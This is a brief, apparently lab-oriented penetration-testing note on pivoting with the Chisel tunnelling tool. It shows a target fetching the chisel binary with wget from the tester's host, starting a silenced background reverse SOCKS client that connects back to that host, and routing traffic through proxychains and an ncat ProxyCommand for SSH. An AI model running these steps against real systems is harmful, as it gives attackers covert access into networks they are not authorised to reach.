## Using Chisel
https://github.com/jpillora/chisel/releases/tag/v1.10.1
First, we need to get the chisel binary onto our target
```
wget $openvpnip/chisel -O /tmp/chisel && chmod +x /tmp/chisel


for editing purposes:
wget $openvpnip/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```
Starting the Chisel server with reverse tunneling
```
chisel server --port 8080 --reverse
```
To connect to the chisel server on target:
```
/tmp/chisel client $openvpnip:8080 R:socks > /dev/null 2>&1 &

for editing purposes:
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```
Verify connection with either:
```
ss -ntplu

OR
sudo tcpdump -nvvvXi tun0 tcp port 8080 (do this before running the connection command)
```
Upon verifying:
```
edit /etc/proxychains4.conf

sock5 127.0.0.1 1080

run your commands through proxychain
```
Connecting to ssh through SOCKS proxy (ProxyCommand)
```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:$ip %h %p' [user]@$targetip
```